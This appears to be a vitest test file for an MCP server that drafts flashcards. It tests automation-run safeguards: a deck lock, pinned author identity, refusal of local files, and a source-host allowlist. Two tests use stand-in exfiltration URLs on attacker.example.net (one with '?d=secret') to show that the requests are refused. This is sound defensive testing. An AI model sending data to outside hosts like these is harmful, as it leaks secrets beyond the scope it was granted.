// submit_draft inside an automation run (contract A00 §11.6): the local runner passes
// DC_AUTOMATION_* to the server, which then always sends the run id in the agent block
// and refuses any other deck. Loopback fakes only.

import { readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { afterEach, describe, expect, it } from 'vitest';
import type { RunProcess } from '../src/ingest';
import { automationAuthorFrom, automationRunFrom, automationSourceHosts, createServer } from '../src/server';
import {
  callTool,
  envelope,
  errorEnvelope,
  fakeIngest,
  ingestDoc,
  makeTestEnv,
  SAMPLE_SOURCES,
  sampleCard,
  sendJson,
  startFakeServer,
  writeValidTokens,
  type FakeHandler,
  type FakeServer,
  type TestEnv,
} from './helpers';

const DECKS_PAGE = {
  items: [
    { id: 7, slug: 'aws-saa-c03-archive', title: 'Old AWS deck' },
    { id: 12, slug: 'aws-saa-c03', title: 'AWS SAA-C03' },
  ],
  nextCursor: null,
  hasMore: false,
};

const SUBMIT_DATA = { batchId: 'b-1', created: [], duplicates: [], rejected: [] };

const RUN_ID = '3F2504E0-4F89-41D3-9A0C-0305E82C3301';
/** M1: the runner's gated author identity (64 lowercase hex digits). */
const AUTHOR_CONFIG_ID = 'a'.repeat(32) + '0123456789abcdef'.repeat(2);
// The runner always passes the run's source hosts (ai-agent-1); the sample sources live on example.com.
const AUTOMATION_ENV = {
  DC_AUTOMATION_RUN_ID: RUN_ID,
  DC_AUTOMATION_QUEUE_ITEM_ID: '42',
  DC_AUTOMATION_DECK_SLUG: 'aws-saa-c03',
  DC_AUTOMATION_SOURCE_HOSTS: 'example.com',
};

const happy: FakeHandler = (req, res) => {
  if (req.method === 'GET' && req.url.startsWith('/api/v1/admin/decks')) return sendJson(res, 200, envelope(DECKS_PAGE));
  if (req.method === 'POST' && req.url === '/api/v1/authoring/drafts') return sendJson(res, 200, envelope(SUBMIT_DATA));
  sendJson(res, 404, errorEnvelope('NOT_FOUND', 'no route'));
};

describe('submit_draft in an automation run', () => {
  let env: TestEnv;
  let api: FakeServer;
  let warnings: string[];
  afterEach(async () => {
    await api?.close();
    env.cleanup();
  });

  /** Like helpers.connect, but with the automation variables and a recorded warn. */
  async function setup(automationEnv: Record<string, string | undefined>): Promise<Client> {
    api = await startFakeServer(happy);
    env = makeTestEnv({ apiBase: api.base });
    writeValidTokens(env.config);
    warnings = [];
    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
    const server = createServer({
      config: env.config,
      runProcess: fakeIngest(SAMPLE_SOURCES).run,
      env: automationEnv,
      warn: (line) => warnings.push(line),
    });
    await server.connect(serverTransport);
    const client = new Client({ name: 'dc-mcp-test', version: '0.0.0' });
    await client.connect(clientTransport);
    return client;
  }

  function postedAgent(): unknown {
    const post = api.requests.find((req) => req.method === 'POST' && req.url === '/api/v1/authoring/drafts');
    expect(post).toBeDefined();
    const body = JSON.parse(post?.body ?? '') as Record<string, unknown>;
    return body.agent;
  }

  function postedBody(): Record<string, unknown> {
    const post = api.requests.find((req) => req.method === 'POST' && req.url === '/api/v1/authoring/drafts');
    return JSON.parse(post?.body ?? '{}') as Record<string, unknown>;
  }

  it('sends runId and queueItemId in the agent block inside an automation run', async () => {
    const client = await setup(AUTOMATION_ENV);
    const result = await callTool(client, 'submit_draft', {
      deckSlug: 'aws-saa-c03',
      drafts: [sampleCard()],
      agent: { model: 'claude-opus-5-5', skillVersion: 'author-cards@1.8.1' },
    });
    expect(result.isError).toBe(false);
    expect(postedAgent()).toEqual({
      name: 'developercards-mcp',
      model: 'claude-opus-5-5',
      skillVersion: 'author-cards@1.8.1',
      runId: RUN_ID.toLowerCase(),
      queueItemId: '42',
    });
    expect(Object.keys(postedAgent() as object)).toEqual(['name', 'model', 'skillVersion', 'runId', 'queueItemId']);
    expect(warnings).toEqual([]);
    await client.close();
  });

  it('sends unknown model and skillVersion when the tool call has no agent', async () => {
    const client = await setup(AUTOMATION_ENV);
    const result = await callTool(client, 'submit_draft', { deckSlug: 'aws-saa-c03', drafts: [sampleCard()] });
    expect(result.isError).toBe(false);
    expect(postedAgent()).toEqual({
      name: 'developercards-mcp',
      model: 'unknown',
      skillVersion: 'unknown',
      runId: RUN_ID.toLowerCase(),
      queueItemId: '42',
    });
    await client.close();
  });

  it('omits queueItemId when the queue item id is not a positive integer, with one warning', async () => {
    const client = await setup({ ...AUTOMATION_ENV, DC_AUTOMATION_QUEUE_ITEM_ID: '0' });
    const result = await callTool(client, 'submit_draft', { deckSlug: 'aws-saa-c03', drafts: [sampleCard()] });
    expect(result.isError).toBe(false);
    expect(postedAgent()).toEqual({ name: 'developercards-mcp', model: 'unknown', skillVersion: 'unknown', runId: RUN_ID.toLowerCase() });
    expect(warnings).toEqual(['developercards-mcp: DC_AUTOMATION_QUEUE_ITEM_ID is not a positive integer; ignored']);
    await client.close();
  });

  it('refuses a different deckSlug with AUTOMATION_DECK_MISMATCH and makes no request', async () => {
    const client = await setup(AUTOMATION_ENV);
    const result = await callTool(client, 'submit_draft', {
      deckSlug: 'aws-saa-c03-archive',
      drafts: [sampleCard()],
      agent: { model: 'claude-opus-5-5', skillVersion: 'author-cards@1.8.1' },
    });
    expect(result.isError).toBe(true);
    expect(result.text.startsWith('AUTOMATION_DECK_MISMATCH: this automation run drafts for deck')).toBe(true);
    expect(result.text).toBe('AUTOMATION_DECK_MISMATCH: this automation run drafts for deck aws-saa-c03');
    expect(api.requests).toEqual([]);
    await client.close();
  });

  it('ignores a run id that is not a uuid with one warning', async () => {
    const client = await setup({ DC_AUTOMATION_RUN_ID: 'not-a-uuid', DC_AUTOMATION_QUEUE_ITEM_ID: '42' });
    const result = await callTool(client, 'submit_draft', {
      deckSlug: 'aws-saa-c03',
      drafts: [sampleCard()],
      agent: { model: 'claude-opus-5-5', skillVersion: 'author-cards@1.8.1' },
    });
    expect(result.isError).toBe(false);
    expect(warnings).toEqual(['developercards-mcp: DC_AUTOMATION_RUN_ID is not a uuid; automation run ignored']);
    expect(postedAgent()).toEqual({ name: 'developercards-mcp', model: 'claude-opus-5-5', skillVersion: 'author-cards@1.8.1' });
    await client.close();
  });

  it('keeps the agent block unchanged outside an automation run', async () => {
    const client = await setup({});
    const without = await callTool(client, 'submit_draft', { deckSlug: 'aws-saa-c03', drafts: [sampleCard()] });
    expect(without.isError).toBe(false);
    expect('agent' in postedBody()).toBe(false);

    api.requests.length = 0;
    const withAgent = await callTool(client, 'submit_draft', {
      deckSlug: 'aws-saa-c03',
      drafts: [sampleCard()],
      agent: { model: 'claude-opus-5-5', skillVersion: '1.0.0' },
    });
    expect(withAgent.isError).toBe(false);
    expect(postedAgent()).toEqual({ name: 'developercards-mcp', model: 'claude-opus-5-5', skillVersion: '1.0.0' });
    expect(warnings).toEqual([]);
    await client.close();
  });
});

describe('read_source egress inside an automation run (ai-agent-1)', () => {
  let env: TestEnv;
  afterEach(() => env.cleanup());

  /** A RunProcess that answers every source like dc-ingest would and records each call's source and env. */
  function recordingIngest(): { calls: Array<{ source: string; env: NodeJS.ProcessEnv }>; run: RunProcess } {
    const calls: Array<{ source: string; env: NodeJS.ProcessEnv }> = [];
    const run: RunProcess = async (_command, args, options) => {
      const source = args[args.length - 1] ?? '';
      calls.push({ source, env: options.env });
      const doc = SAMPLE_SOURCES[source] ?? { sourceId: 'sid-any', chunks: ['Any page text that is long enough.'] };
      return { code: 0, stdout: `${JSON.stringify(ingestDoc(source, doc))}\n`, stderr: '' };
    };
    return { calls, run };
  }

  async function connectWith(serverEnv: Record<string, string | undefined>, run: RunProcess): Promise<Client> {
    env = makeTestEnv();
    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
    const server = createServer({ config: env.config, runProcess: run, env: serverEnv, warn: () => undefined });
    await server.connect(serverTransport);
    const client = new Client({ name: 'dc-mcp-test', version: '0.0.0' });
    await client.connect(clientTransport);
    return client;
  }

  it('refuses a host outside DC_AUTOMATION_SOURCE_HOSTS before any fetch and passes the list to dc-ingest', async () => {
    const ingest = recordingIngest();
    const client = await connectWith({ ...AUTOMATION_ENV, DC_AUTOMATION_SOURCE_HOSTS: ' Example.com ,docs.aws.amazon.com' }, ingest.run);

    const denied = await callTool(client, 'read_source', { source: 'https://attacker.example.net/?d=secret' });
    expect(denied.isError).toBe(true);
    expect(denied.text).toBe(
      'SOURCE_HOST_NOT_ALLOWED: attacker.example.net is not in DC_AUTOMATION_SOURCE_HOSTS; an automation run reads only example.com, docs.aws.amazon.com',
    );
    expect(ingest.calls).toEqual([]);

    // submit_draft's implicit read of an unread citation goes through the same check.
    const card = sampleCard();
    const submitted = await callTool(client, 'submit_draft', {
      deckSlug: 'aws-saa-c03',
      drafts: [{ ...card, source: { ...card.source, url: 'https://attacker.example.net/leak' } }],
    });
    expect(submitted.isError).toBe(true);
    expect(submitted.text).toMatch(/SOURCE_NOT_INGESTED/);
    expect(ingest.calls).toEqual([]);

    const allowed = await callTool(client, 'read_source', { source: 'https://example.com/s3/retrieval-options' });
    expect(allowed.isError).toBe(false);
    expect(ingest.calls.map((c) => c.source)).toEqual(['https://example.com/s3/retrieval-options']);
    expect(ingest.calls[0]?.env.DC_INGEST_ALLOWED_HOSTS).toBe('example.com,docs.aws.amazon.com');
    await client.close();
  });

  it('falls back to the default documentation hosts when the runner passes no list', async () => {
    const ingest = recordingIngest();
    const client = await connectWith({ DC_AUTOMATION_RUN_ID: RUN_ID }, ingest.run);
    const denied = await callTool(client, 'read_source', { source: 'https://example.com/s3/retrieval-options' });
    expect(denied.isError).toBe(true);
    expect(denied.text).toMatch(/^SOURCE_HOST_NOT_ALLOWED: example\.com /);
    const allowed = await callTool(client, 'read_source', { source: 'https://docs.aws.amazon.com/lambda/latest/dg/welcome.html' });
    expect(allowed.isError).toBe(false);
    expect(ingest.calls[0]?.env.DC_INGEST_ALLOWED_HOSTS).toBe(
      'docs.aws.amazon.com,aws.amazon.com,platform.claude.com,docs.claude.com,docs.anthropic.com,www.anthropic.com',
    );
    await client.close();
  });

  it('keeps read_source unlimited outside an automation run', async () => {
    const ingest = recordingIngest();
    const client = await connectWith({ DC_AUTOMATION_SOURCE_HOSTS: 'docs.aws.amazon.com' }, ingest.run);
    const read = await callTool(client, 'read_source', { source: 'https://example.com/s3/retrieval-options' });
    expect(read.isError).toBe(false);
    expect(ingest.calls[0]?.env.DC_INGEST_ALLOWED_HOSTS).toBeUndefined();
    expect(automationSourceHosts({ runId: null, queueItemId: null, deckSlug: null }, { DC_AUTOMATION_SOURCE_HOSTS: 'a.example' })).toBeUndefined();
    await client.close();
  });
});

describe('the pinned author configuration (ai-agent-3)', () => {
  let env: TestEnv;
  let api: FakeServer;
  afterEach(async () => {
    await api?.close();
    env.cleanup();
  });

  it('sends the runner-pinned model and skill version instead of what the model claims', async () => {
    api = await startFakeServer(happy);
    env = makeTestEnv({ apiBase: api.base });
    writeValidTokens(env.config);
    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
    const server = createServer({
      config: env.config,
      runProcess: fakeIngest(SAMPLE_SOURCES).run,
      env: {
        ...AUTOMATION_ENV,
        DC_AUTOMATION_AUTHOR_MODEL: 'claude-opus-5-5',
        DC_AUTOMATION_SKILL_VERSION: 'author-cards@1.8.1',
        DC_AUTOMATION_AUTHOR_CONFIG_ID: AUTHOR_CONFIG_ID,
      },
      warn: () => undefined,
    });
    await server.connect(serverTransport);
    const client = new Client({ name: 'dc-mcp-test', version: '0.0.0' });
    await client.connect(clientTransport);

    const result = await callTool(client, 'submit_draft', {
      deckSlug: 'aws-saa-c03',
      drafts: [sampleCard()],
      agent: { model: 'something-else', skillVersion: 'author-cards@9.9.9' },
    });
    expect(result.isError).toBe(false);
    const post = api.requests.find((req) => req.method === 'POST' && req.url === '/api/v1/authoring/drafts');
    expect((JSON.parse(post?.body ?? '{}') as { agent: unknown }).agent).toEqual({
      name: 'developercards-mcp',
      model: 'claude-opus-5-5',
      skillVersion: 'author-cards@1.8.1',
      authorConfigId: AUTHOR_CONFIG_ID,
      runId: RUN_ID.toLowerCase(),
      queueItemId: '42',
    });
    await client.close();
  });

  it('sends no authorConfigId when the runner set none, and never takes one from the model (M1)', async () => {
    api = await startFakeServer(happy);
    env = makeTestEnv({ apiBase: api.base });
    writeValidTokens(env.config);
    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
    const server = createServer({ config: env.config, runProcess: fakeIngest(SAMPLE_SOURCES).run, env: AUTOMATION_ENV, warn: () => undefined });
    await server.connect(serverTransport);
    const client = new Client({ name: 'dc-mcp-test', version: '0.0.0' });
    await client.connect(clientTransport);
    const refused = await callTool(client, 'submit_draft', {
      deckSlug: 'aws-saa-c03',
      drafts: [sampleCard()],
      agent: { model: 'm', skillVersion: 'author-cards@1.8.1', authorConfigId: AUTHOR_CONFIG_ID },
    });
    expect(refused.isError).toBe(true);
    const result = await callTool(client, 'submit_draft', { deckSlug: 'aws-saa-c03', drafts: [sampleCard()] });
    expect(result.isError).toBe(false);
    const post = api.requests.find((req) => req.method === 'POST' && req.url === '/api/v1/authoring/drafts');
    expect((JSON.parse(post?.body ?? '{}') as { agent: Record<string, unknown> }).agent).not.toHaveProperty('authorConfigId');
    await client.close();
  });

  it('reads only printable single-token values', () => {
    expect(automationAuthorFrom({ DC_AUTOMATION_AUTHOR_MODEL: ' claude-opus-5-5 ', DC_AUTOMATION_SKILL_VERSION: 'bad value' })).toEqual({
      model: 'claude-opus-5-5',
      skillVersion: null,
      authorConfigId: null,
    });
    expect(automationAuthorFrom({})).toEqual({ model: null, skillVersion: null, authorConfigId: null });
    // M1: at most 128 printable characters, one token.
    expect(automationAuthorFrom({ DC_AUTOMATION_AUTHOR_CONFIG_ID: ` ${AUTHOR_CONFIG_ID} ` }).authorConfigId).toBe(AUTHOR_CONFIG_ID);
    expect(automationAuthorFrom({ DC_AUTOMATION_AUTHOR_CONFIG_ID: 'a'.repeat(128) }).authorConfigId).toBe('a'.repeat(128));
    expect(automationAuthorFrom({ DC_AUTOMATION_AUTHOR_CONFIG_ID: 'a'.repeat(129) }).authorConfigId).toBeNull();
    expect(automationAuthorFrom({ DC_AUTOMATION_AUTHOR_CONFIG_ID: 'two words' }).authorConfigId).toBeNull();
  });
});

describe('local sources in an automation run (P3, ai-agent-30)', () => {
  let env: TestEnv;
  let api: FakeServer;
  afterEach(async () => {
    await api?.close();
    env.cleanup();
  });

  async function setup(automationEnv: Record<string, string | undefined>, runProcess: RunProcess): Promise<Client> {
    api = await startFakeServer(happy);
    env = makeTestEnv({ apiBase: api.base });
    writeValidTokens(env.config);
    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
    const server = createServer({ config: env.config, runProcess, env: automationEnv, warn: () => undefined });
    await server.connect(serverTransport);
    const client = new Client({ name: 'dc-mcp-test', version: '0.0.0' });
    await client.connect(clientTransport);
    return client;
  }

  /** dc-ingest's answer for a local file: `path` set, `url` the canonicalUrl the agent passed. */
  function localIngest(): { run: RunProcess; calls: string[][] } {
    const calls: string[][] = [];
    const run: RunProcess = async (_command, args) => {
      calls.push(args);
      const i = args.indexOf('--canonical-url');
      const url = i >= 0 ? (args[i + 1] ?? '') : (args[args.length - 1] ?? '');
      const doc = SAMPLE_SOURCES[url];
      if (doc === undefined) return { code: 1, stdout: '', stderr: 'dc-ingest: error: not found\n' };
      return { code: 0, stdout: `${JSON.stringify({ ...ingestDoc(url, doc), path: '/repo/sources/retrieval.md' })}\n`, stderr: '' };
    };
    return { run, calls };
  }

  it('refuses a local path in read_source with SOURCE_LOCAL_NOT_ALLOWED_IN_AUTOMATION before dc-ingest runs', async () => {
    const ingest = localIngest();
    const client = await setup(AUTOMATION_ENV, ingest.run);
    const result = await callTool(client, 'read_source', {
      source: 'sources/retrieval.md',
      canonicalUrl: 'https://example.com/s3/retrieval-options',
    });
    expect(result.isError).toBe(true);
    expect(result.text).toMatch(/^SOURCE_LOCAL_NOT_ALLOWED_IN_AUTOMATION: /);
    expect(ingest.calls).toEqual([]);
    await client.close();
  });

  it('still reads a local path outside an automation run', async () => {
    const ingest = localIngest();
    const client = await setup({}, ingest.run);
    const result = await callTool(client, 'read_source', {
      source: 'sources/retrieval.md',
      canonicalUrl: 'https://example.com/s3/retrieval-options',
    });
    expect(result.isError).toBe(false);
    expect(ingest.calls).toHaveLength(1);
    await client.close();
  });

  it('refuses a canonicalUrl whose host is not allowed in an automation run', async () => {
    const ingest = localIngest();
    const client = await setup(AUTOMATION_ENV, ingest.run);
    const result = await callTool(client, 'read_source', {
      source: 'https://example.com/s3/retrieval-options',
      canonicalUrl: 'https://docs.example.org/s3/retrieval-options',
    });
    expect(result.isError).toBe(true);
    expect(result.text).toMatch(/^SOURCE_HOST_NOT_ALLOWED: docs\.example\.org /);
    expect(ingest.calls).toEqual([]);
    await client.close();
  });

  it('refuses in submit_draft a remembered document that dc-ingest read from disk, with no API call', async () => {
    // Defence in depth: however a local document got into the store, an automation run never cites it.
    const ingest = localIngest();
    const client = await setup(AUTOMATION_ENV, ingest.run);
    const read = await callTool(client, 'read_source', { source: 'https://example.com/s3/retrieval-options' });
    expect(read.isError).toBe(false);
    const result = await callTool(client, 'submit_draft', { deckSlug: 'aws-saa-c03', drafts: [sampleCard()] });
    expect(result.isError).toBe(true);
    expect(result.text).toMatch(/sample-qa-topic-02: SOURCE_LOCAL_NOT_ALLOWED_IN_AUTOMATION/);
    expect(api.requests.filter((req) => req.method === 'POST')).toEqual([]);
    await client.close();
  });

  it('keeps submitting a remembered local document outside an automation run', async () => {
    const ingest = localIngest();
    const client = await setup({}, ingest.run);
    await callTool(client, 'read_source', { source: 'sources/retrieval.md', canonicalUrl: 'https://example.com/s3/retrieval-options' });
    const result = await callTool(client, 'submit_draft', { deckSlug: 'aws-saa-c03', drafts: [sampleCard()] });
    expect(result.isError).toBe(false);
    expect((JSON.parse(result.text) as { grounding: Array<{ kind: string }> }).grounding[0]?.kind).toBe('local');
    await client.close();
  });
});

describe('the API surface', () => {
  it('adds no API call literal under src', () => {
    // The regex of AgentClientPolicyTests, which pins the agent client's API surface.
    const re = /'(GET|POST)'\s*,\s*[`'](\/api\/[^`'?$]+)/g;
    const srcDir = fileURLToPath(new URL('../src', import.meta.url));
    const files = (readdirSync(srcDir, { recursive: true }) as string[]).filter((name) => name.endsWith('.ts'));
    const calls = new Set<string>();
    for (const name of files) {
      for (const match of readFileSync(join(srcDir, name), 'utf8').matchAll(re)) calls.add(`${match[1]} ${match[2]}`);
    }
    expect([...calls].sort()).toEqual(['GET /api/v1/admin/decks', 'POST /api/v1/authoring/cards/similar', 'POST /api/v1/authoring/drafts']);
  });
});

describe('automationRunFrom', () => {
  it('reads nothing from an empty environment and never warns', () => {
    const warnings: string[] = [];
    expect(automationRunFrom({ DC_AUTOMATION_RUN_ID: '  ', DC_AUTOMATION_DECK_SLUG: '' }, (line) => warnings.push(line))).toEqual({
      runId: null,
      queueItemId: null,
      deckSlug: null,
    });
    expect(warnings).toEqual([]);
  });

  it('trims every value and lowercases the run id', () => {
    const warnings: string[] = [];
    const run = automationRunFrom(
      { DC_AUTOMATION_RUN_ID: ` ${RUN_ID} `, DC_AUTOMATION_QUEUE_ITEM_ID: ' 9223372036854775807 ', DC_AUTOMATION_DECK_SLUG: ' aws-saa-c03 ' },
      (line) => warnings.push(line),
    );
    expect(run).toEqual({ runId: RUN_ID.toLowerCase(), queueItemId: '9223372036854775807', deckSlug: 'aws-saa-c03' });
    expect(warnings).toEqual([]);
  });
});
